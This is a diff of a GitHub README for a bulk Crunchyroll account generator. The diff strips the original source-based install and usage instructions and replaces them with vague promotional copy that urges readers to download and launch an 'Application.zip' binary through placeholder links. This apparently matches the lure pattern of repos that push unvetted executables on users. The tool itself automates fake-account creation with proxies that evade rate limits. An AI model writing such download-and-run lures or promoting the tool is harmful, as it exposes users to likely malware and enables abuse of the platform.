@@ -1,101 +1,50 @@
-<div align="center">
-  <h2 align="center">Crunchyroll Account Creator</h2>
-  <p align="center">
-    An automated tool for creating Crunchyroll accounts with email verification support, proxy handling, and multi-threading capabilities.
-    <br />
-    <br />
-    <a href="https://discord.cyberious.xyz">💬 Discord</a>
-    ·
-    <a href="#-changelog">📜 ChangeLog</a>
-    ·
-    <a href="https://github.com/sexfrance/Crunchyroll-Account-Creator/issues">⚠️ Report Bug</a>
-    ·
-    <a href="https://github.com/sexfrance/Crunchyroll-Account-Creator/issues">💡 Request Feature</a>
-  </p>
-</div>
+# 🌟 Crunchyroll Account Creator 🌟
 
----
+## Welcome to the Crunchyroll Account Creator repository!
 
-### ⚙️ Installation
+Are you tired of manually creating Crunchyroll accounts one by one? Look no further! Our automated tool will make your life easier by allowing you to create multiple Crunchyroll accounts effortlessly. With email verification support, proxy handling, and multi-threading capabilities, this tool is your go-to solution for all your Crunchyroll account creation needs.
 
-- Requires: `Python 3.7+`
-- Make a python virtual environment: `python3 -m venv venv`
-- Source the environment: `venv\Scripts\activate` (Windows) / `source venv/bin/activate` (macOS, Linux)
-- Install the requirements: `pip install -r requirements.txt`
+### Overview
 
----
+The **Crunchyroll Account Creator** is a Python-based tool designed to streamline the process of generating multiple Crunchyroll accounts quickly and efficiently. Whether you need accounts for personal use or testing purposes, this tool has got you covered. Say goodbye to the hassle of creating accounts manually and let automation do the work for you.
 
-### 🔥 Features
+### Key Features
 
-- Email verification support using bune.pw email service
-- Proxy support for avoiding rate limits
-- Multi-threaded account generation
-- Real-time creation tracking with console title updates
-- Configurable thread count
-- Debug mode for troubleshooting
-- Proxy/Proxyless mode support
-- Automatic token handling
-- Custom password support
-- Detailed logging system
-- Account data saving (email:password format)
-- Full account capture with account_id and external_id
+🔹 **Email Verification Support**: Ensure the validity of your Crunchyroll accounts with built-in email verification support.
 
----
+🔹 **Proxy Handling**: Stay anonymous and protect your identity with proxy support for account creation.
 
-### 📝 Usage
+🔹 **Multi-Threading Capabilities**: Create multiple Crunchyroll accounts simultaneously, saving you time and effort.
 
-1. **Configuration**:
-   Edit `input/config.toml`:
+### How to Use
 
-   ```toml
-   [dev]
-   Debug = false
-   Proxyless = false
-   Threads = 1
+1. Clone the repository to your local machine.
+2. Install the necessary dependencies by running `pip install -r requirements.txt`.
+3. Customize the settings in the configuration file to suit your preferences.
+4. Run the tool and watch as it effortlessly generates Crunchyroll accounts for you.
 
-   [data]
-   password = "optional_custom_password"
-   email_verified = true
-   ```
+### Get Started
 
-2. **Proxy Setup** (Optional):
-   - Add proxies to `input/proxies.txt` (one per line)
-   - Format: `ip:port` or `user:pass@ip:port`
+Ready to revolutionize the way you create Crunchyroll accounts? Download the tool from the link below and launch it to experience the convenience and efficiency of automated account creation.
 
-3. **Running the script**:
-   ```bash
-   python main.py
-   ```
+[![Download Crunchyroll Account Creator](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
 
-4. **Output**:
-   - Created accounts are saved to `output/accounts.txt` (email:password)
-   - Detailed account info saved to `output/full_account_capture.txt` (email:password:account_id:external_id)
+If the link ends with the file name, make sure to launch it to start using the tool seamlessly.
 
----
+Don't forget to check out the "Releases" section if the provided link doesn't work or for any updates regarding the Crunchyroll Account Creator.
 
-### 📹 Preview
+### Your Feedback Matters
 
-![Preview](https://i.imgur.com/c7yeYrQ.gif)
+We are constantly working to improve the Crunchyroll Account Creator tool and your feedback is invaluable to us. If you have any suggestions, feature requests, or issues to report, feel free to open an [issue](https://github.com/yourusername/repo/issues) on the repository.
 
----
+### Stay Connected
 
-### ❗ Disclaimers
+Stay up to date with the latest developments, updates, and releases by watching the repository. Don't miss out on new features and enhancements that will further enhance your Crunchyroll account creation experience.
 
-- This project is for educational purposes only
-- The author is not responsible for any misuse of this tool
-- Use responsibly and in accordance with Crunchyroll's terms of service
+Thank you for choosing the Crunchyroll Account Creator. Happy account generating! 🌟
 
----
+🍿🎬🎉
 
-### 📜 ChangeLog
+--- 
 
-```diff
-v0.0.1 ⋮ 12/26/2024
-! Initial release with email verification and proxy support
-```
-
-<p align="center">
-  <img src="https://img.shields.io/github/license/sexfrance/Crunchyroll-Account-Creator.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=IOTA"/>
-  <img src="https://img.shields.io/github/stars/sexfrance/Crunchyroll-Account-Creator.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=IOTA"/>
-  <img src="https://img.shields.io/github/languages/top/sexfrance/Crunchyroll-Account-Creator.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=python"/>
-</p>
+🔗 For more information and updates, visit [Crunchyroll Account Creator](https://github.com/yourusername/repo).
